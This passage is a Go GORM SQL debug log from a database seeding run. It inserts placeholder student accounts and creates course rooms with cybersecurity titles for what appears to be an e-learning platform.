[0m[33m[0.485ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 89 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.088ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.35','2025-06-09 14:07:52.35',NULL,false,89) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[14.497ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.356','2025-06-09 14:07:52.356',NULL,'zbjeboqocf','PmejZzJ','zLFKRrW','PCods','student33@example.com','+200000032','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.030ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 90 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[12.388ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.372','2025-06-09 14:07:52.372',NULL,false,90) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.685ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.383','2025-06-09 14:07:52.383',NULL,'ufofcltmxq','HErNatq','WFjafDq','FFfmN','student34@example.com','+200000033','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.451ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 91 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.726ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.389','2025-06-09 14:07:52.389',NULL,false,91) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.541ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.395','2025-06-09 14:07:52.395',NULL,'wogytdcvsc','ZtrEIQB','chdOiSJ','PKHzp','student35@example.com','+200000034','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.496ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 92 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.997ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.401','2025-06-09 14:07:52.401',NULL,false,92) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.865ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.406','2025-06-09 14:07:52.406',NULL,'cacpkqpucm','feLzGit','aJPaCLf','sEIMv','student36@example.com','+200000035','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.841ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 93 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.915ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.413','2025-06-09 14:07:52.413',NULL,false,93) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[9.271ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.424','2025-06-09 14:07:52.424',NULL,'swetaajbrr','LMObxEN','mApcRIz','XlgrI','student37@example.com','+200000036','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.533ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 94 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.306ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.431','2025-06-09 14:07:52.431',NULL,false,94) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.819ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.437','2025-06-09 14:07:52.437',NULL,'ipuskciede','NcxxjYC','tPZHlwN','baRJq','student38@example.com','+200000037','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[3.331ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 95 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[9.086ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.447','2025-06-09 14:07:52.447',NULL,false,95) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.520ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.452','2025-06-09 14:07:52.452',NULL,'bniritlpfi','CjQkCDQ','QYyktXD','meKKU','student39@example.com','+200000038','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.521ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 96 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.762ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.459','2025-06-09 14:07:52.459',NULL,false,96) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.582ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.465','2025-06-09 14:07:52.465',NULL,'kdeefwayxu','nkLUsFE','zdALOwy','glGPM','student40@example.com','+200000039','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.505ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 97 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[9.190ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.474','2025-06-09 14:07:52.474',NULL,false,97) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.508ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.48','2025-06-09 14:07:52.48',NULL,'kvlviqsofw','BJVZcbt','yKUTGJw','vfFIi','student41@example.com','+200000040','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.472ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 98 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.910ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.486','2025-06-09 14:07:52.486',NULL,false,98) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.544ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.492','2025-06-09 14:07:52.492',NULL,'baskhunkuu','mLCGSTz','JvJjZrS','PBCRM','student42@example.com','+200000041','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.482ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 99 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.924ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.498','2025-06-09 14:07:52.498',NULL,false,99) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.655ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.504','2025-06-09 14:07:52.504',NULL,'ypqoltbhse','MJHBJCU','VkTqaxD','TYhxp','student43@example.com','+200000042','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 100 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.966ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.51','2025-06-09 14:07:52.51',NULL,false,100) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.695ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.515','2025-06-09 14:07:52.515',NULL,'kbedydqjrp','IzSwfsl','VTDHCaF','yOgTR','student44@example.com','+200000043','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.537ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 101 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[8.544ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.524','2025-06-09 14:07:52.524',NULL,false,101) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.584ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.53','2025-06-09 14:07:52.53',NULL,'dckuusbxnh','cbaBBrC','NFoVwmH','UJfXm','student45@example.com','+200000044','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.447ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 102 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.995ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.536','2025-06-09 14:07:52.536',NULL,false,102) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.563ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.542','2025-06-09 14:07:52.542',NULL,'lcmmkwmuuz','orIHXJQ','FhddgJk','ITeRd','student46@example.com','+200000045','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.490ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 103 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[5.932ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.548','2025-06-09 14:07:52.548',NULL,false,103) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.580ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.554','2025-06-09 14:07:52.554',NULL,'yrzyjzhjmf','dcAhroT','NYErpaD','hTBTb','student47@example.com','+200000046','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 104 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.075ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.561','2025-06-09 14:07:52.561',NULL,false,104) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.661ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.566','2025-06-09 14:07:52.566',NULL,'vrplganosr','FaOplPN','UUTHpME','UaNSg','student48@example.com','+200000047','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.196ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 105 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[6.675ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.573','2025-06-09 14:07:52.573',NULL,false,105) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[6.026ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.579','2025-06-09 14:07:52.579',NULL,'vgceuyzrco','CEePRiN','HdclHLd','oYTMo','student49@example.com','+200000048','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.915ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 106 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[7.378ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.587','2025-06-09 14:07:52.587',NULL,false,106) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/UserModel.go:88
[0m[33m[5.528ms] [34;1m[rows:1][0m INSERT INTO "users" ("created_at","updated_at","deleted_at","user_name","first_name","last_name","middle_name","email","phone","password","email_verified","phone_verified","locked") VALUES ('2025-06-09 14:07:52.593','2025-06-09 14:07:52.593',NULL,'keotehgpbf','XsHbRkJ','CFVhOZD','dTmta','student50@example.com','+200000049','$2a$12$PErH0BXgEQ/iz6IKWsn8a.sneqVoyA3SIuG.DBDB7xhwkjjBh5rLu',true,true,false) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "users" WHERE "users"."id" = 107 AND "users"."deleted_at" IS NULL ORDER BY "users"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/StudentModel.go:24
[0m[33m[12.833ms] [34;1m[rows:1][0m INSERT INTO "students" ("created_at","updated_at","deleted_at","is_premiem","user_id") VALUES ('2025-06-09 14:07:52.599','2025-06-09 14:07:52.599',NULL,false,107) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.969ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.009ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2025-06-09 14:07:52.611','2025-06-09 14:07:52.612',NULL,'cybersecurity fundamentals','Introduction to cybersecurity concepts and principles',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.708ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[8.074ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2025-05-09 14:07:52.619','2025-06-09 14:07:52.62',NULL,'network security','Securing network infrastructure and protocols',true,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.627ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.651ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2025-04-09 14:07:52.627','2025-06-09 14:07:52.628',NULL,'web application security','Protecting web applications from vulnerabilities',false,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.504ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[15.913ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2025-03-09 14:07:52.634','2025-06-09 14:07:52.643',NULL,'cryptography','Encryption algorithms and secure communication',false,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.646ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[6.636ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2025-02-09 14:07:52.65','2025-06-09 14:07:52.651',NULL,'penetration testing','Ethical hacking and vulnerability assessment',true,false,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.594ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
[0m[33m[17.253ms] [34;1m[rows:1][0m INSERT INTO "rooms" ("created_at","updated_at","deleted_at","title","description","room_verified","locked","instructor_id") VALUES ('2025-01-09 14:07:52.657','2025-06-09 14:07:52.658',NULL,'digital forensics','Investigating cyber crimes and analyzing digital evidence',false,true,1) RETURNING "id"

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:39
[0m[33m[0.818ms] [34;1m[rows:1][0m SELECT * FROM "instructors" WHERE "instructors"."id" = 1 AND "instructors"."deleted_at" IS NULL ORDER BY "instructors"."id" LIMIT 1

2025/06/09 14:07:52 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/RoomModel.go:75
